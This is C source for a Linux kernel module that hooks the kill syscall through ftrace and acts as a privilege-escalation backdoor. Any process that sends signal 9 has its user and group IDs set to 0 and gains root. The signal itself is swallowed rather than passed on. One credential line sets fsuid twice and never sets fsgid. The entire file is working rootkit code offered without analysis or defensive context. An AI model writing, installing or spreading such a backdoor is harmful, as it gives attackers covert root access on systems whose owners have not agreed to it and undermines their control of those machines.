#include<linux/module.h>
#include "libs/ftrace_helper.h"

#define ROOT_SIG 9

  // change credentials
void root_me(void)
{
  struct cred *modcred;
  modcred=prepare_creds();

  if (modcred==NULL)
	  return;

  modcred->uid.val = modcred->gid.val = 0;
  modcred->euid.val = modcred->egid.val = 0;
  modcred->suid.val = modcred->sgid.val = 0;
  modcred->fsuid.val = modcred->fsuid.val = 0;

  commit_creds(modcred);
}

  // original kill
asmlinkage long (*orig_kill)(const struct pt_regs *regs);
  // hooked kill
asmlinkage int handler_kill(const struct pt_regs *regs)
{
  int sig=regs->si;
  switch (sig){
    case ROOT_SIG:
	    root_me();
	    break;
    default:
	    return orig_kill(regs);
  }

  return 0;
}

static struct ftrace_hook hooks[] = { HOOK("__x64_sys_kill", handler_kill, &orig_kill), };

static int __init rootme_init(void)
{
  fh_install_hooks(hooks, ARRAY_SIZE(hooks));
  return 0;
}

static void __exit rootme_exit(void)
{
  fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootme_init);
module_exit(rootme_exit);
